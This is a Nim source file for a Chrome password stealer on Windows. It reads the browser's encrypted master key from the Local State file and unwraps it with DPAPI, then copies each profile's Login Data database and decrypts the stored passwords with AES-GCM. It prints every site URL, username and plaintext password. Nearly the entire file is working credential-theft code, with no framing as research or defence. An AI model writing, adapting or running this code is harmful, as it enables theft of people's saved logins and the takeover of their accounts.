import std/[os, json, base64, net, tables, nativesockets, re]
import tiny_sqlite
import system
import winim/[lean, com]
import nimcrypto/[rijndael, bcmode]

let 
  CHROME_PATH_LOCAL_STATE = joinPath(getEnv("USERPROFILE"), r"AppData\Local\Google\Chrome\User Data\Local State")
  CHROME_PATH = joinPath(getEnv("USERPROFILE"), r"AppData\Local\Google\Chrome\User Data")
  # OUTPUT_FILE_PATH = r"C:\temp\output.txt"

proc cryptUnprotectData(data: openarray[byte|char]): string =
  var
    input = DATA_BLOB(cbData: cint data.len, pbData: cast[ptr BYTE](unsafeaddr data[0]))
    output: DATA_BLOB
  
  if CryptUnprotectData(addr input, nil, nil, nil, nil, 0, addr output) != 0:
    result.setLen(output.cbData)
    if output.cbData != 0:
      copyMem(addr result[0], output.pbData, output.cbData)
    LocalFree(cast[HLOCAL](output.pbData))

proc cryptUnprotectData(data: string): string {.inline.} = 
  result = cryptUnprotectData(data.toOpenArray(0, data.len - 1))

proc expandvars(path: string): string =
  var buffer = T(MAX_PATH)
  ExpandEnvironmentStrings(path, &buffer, MAX_PATH)
  result = $buffer

proc passwordDecrtypth(data: openarray[byte]): string =

  var key {.global.}: string

  if data[0 ..< 3] == [byte 118, 49, 48]:
    # load the key from the local state if we haven't already
    if key.len == 0:
      let json = parseFile(expandvars(CHROME_PATH_LOCAL_STATE))
      key = json["os_crypt"]["encrypted_key"].getStr().decode().substr(5).cryptUnprotectData()
    
    var
      ctx: GCM[aes256]
      aad: seq[byte]
      iv = data[3 ..< 3 + 12]
      encrypted = data[3 + 12 ..< data.len - 16]
      tag = data[data.len - 16 ..< data.len]
      dtag: array[aes256.sizeBlock, byte]
    
    # decrypt the blob
    if encrypted.len > 0:
      result.setLen(encrypted.len)
      ctx.init(key.toOpenArrayByte(0, key.len - 1), iv, aad)
      ctx.decrypt(encrypted, result.toOpenArrayByte(0, result.len - 1))
      ctx.getTag(dtag)
      assert(dtag == tag)
  else:
    result = cryptUnprotectData(data)

when isMainModule:
  try:
    var folders: seq[string] = @[]

    for element in walkDir(CHROME_PATH):
      if contains(element.path, re"Profile \d+$|Default$"):
          folders.add(element.path)

    for folder in folders:
      let filename = joinPath(folder, "Login Data")
      copyFile(expandvars(filename), expandvars(filename & "_bak"))

      # load the database from disk
      let db = openDatabase(expandvars(filename & "_bak"))
      defer: db.close()

      for row in db.iterate("SELECT action_url, username_value, password_value FROM logins"):
        echo "URL: ", row[0].fromDbValue(string)
        echo "USERNAME: ", row[1].fromDbValue(string)
        echo "PASSWORD: ", passwordDecrtypth(row[2].fromDbValue(seq[byte]))
        echo ""
  except Exception as e:
    echo("[ERR] ", e.msg)
  finally:
    # Close the text file
    echo("finished")
    # close(outputFile)
